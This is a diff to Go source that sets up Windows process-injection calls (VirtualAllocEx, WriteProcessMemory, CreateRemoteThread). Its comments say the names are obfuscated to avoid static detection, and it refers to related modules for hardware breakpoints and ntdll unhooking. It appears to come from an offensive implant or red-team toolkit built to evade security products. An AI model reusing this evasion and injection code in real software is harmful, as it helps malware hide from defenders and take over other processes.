@@ -42,27 +42,26 @@ const (
 	PAGE_READWRITE    = 0x04
 )
 
-// Injection API procs — resolved at runtime from encrypted names to avoid
-// static string detection (VirtualAllocEx, WriteProcessMemory, CreateRemoteThread, etc.)
+// Injection API procs — critical procs (VirtualAllocEx, WriteProcessMemory, etc.)
+// use obfuscated names resolved via ensureInjectionAPIs(). kernel32 and CloseHandle
+// are pre-initialized so that dependent files (hwbp, ntdll_unhook, spawn, etc.) that
+// capture kernel32 at package init time always get a valid LazyDLL reference.
 var (
-	kernel32               *syscall.LazyDLL
+	kernel32               = syscall.NewLazyDLL("kernel32.dll")
 	procVirtualAllocEx     *syscall.LazyProc
 	procWriteProcessMemory *syscall.LazyProc
 	procCreateRemoteThread *syscall.LazyProc
 	procOpenProcess        *syscall.LazyProc
-	procCloseHandle        *syscall.LazyProc
+	procCloseHandle        = kernel32.NewProc("CloseHandle")
 	initInjectionAPIs      sync.Once
 )
 
 func ensureInjectionAPIs() {
 	initInjectionAPIs.Do(func() {
-		k32 := obfuscate.Kernel32Dll()
-		kernel32 = syscall.NewLazyDLL(k32)
 		procVirtualAllocEx = kernel32.NewProc(obfuscate.VirtualAllocEx())
 		procWriteProcessMemory = kernel32.NewProc(obfuscate.WriteProcessMemory())
 		procCreateRemoteThread = kernel32.NewProc(obfuscate.CreateRemoteThread())
 		procOpenProcess = kernel32.NewProc(obfuscate.OpenProcess())
-		procCloseHandle = kernel32.NewProc("CloseHandle")
 	})
 }
 
